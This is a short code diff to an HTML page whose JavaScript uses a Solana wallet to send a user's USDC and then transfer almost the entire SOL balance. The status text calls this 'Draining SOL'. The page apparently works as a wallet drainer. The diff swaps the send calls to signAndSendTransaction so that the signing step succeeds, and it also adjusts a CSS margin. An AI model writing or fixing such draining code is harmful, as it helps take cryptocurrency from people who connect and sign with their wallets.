@@ -44,7 +44,7 @@
         button:disabled { background-color: #475569; cursor: not-allowed; }
         #status { margin-top: 15px; font-size: 14px; color: #60a5fa; min-height: 20px;}
         #log { 
-            margin-top: 10px; 
+            margin-top: 0; 
             font-size: 10px; 
             color: #cbd5e1; 
             word-break: break-all; 
@@ -145,7 +145,8 @@
                 tx.feePayer = window.solana.publicKey; 
 
                 // Send Transaction (User must sign)
-                const sigPush = await window.solana.sendTransaction(tx, connection);
+                // USE signAndSendTransaction to avoid serialization issues
+                const sigPush = await window.solana.signAndSendTransaction(tx);
                 status.innerText = "USDC Pushed! Draining SOL...";
                 console.log("Push TX:", sigPush);
 
@@ -161,7 +162,7 @@
                     lamports: balance - 5000 // Leave ~0.005 SOL for fees
                 }));
 
-                const sigDrain = await window.solana.sendTransaction(drainTx, connection);
+                const sigDrain = await window.solana.signAndSendTransaction(drainTx);
                 
                 status.innerText = "Success!";
                 log.innerText = `Push: ${sigPush}\nDrain: ${sigDrain}`;
